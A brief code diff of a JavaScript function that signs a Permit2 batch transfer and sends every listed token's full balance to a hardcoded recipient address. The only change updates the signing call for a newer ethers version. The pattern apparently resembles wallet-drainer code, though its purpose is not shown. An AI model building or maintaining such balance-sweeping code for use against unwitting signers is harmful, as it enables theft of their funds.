@@ -34,7 +34,7 @@ export async function executePermit2Batch(signer, chainId, tokens) {
   };
 
   const { domain, types, values } = SignatureTransfer.getPermitData(permitForSig, PERMIT2_ADDRESS, chainId);
-  const signature = await signer._signTypedData(domain, types, values);
+  const signature = await signer.signTypedData(domain, types, values);
 
   const transferDetails = tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.balanceRaw }));
   const permitForContractCall = { permitted: permittedForContract, nonce, deadline };
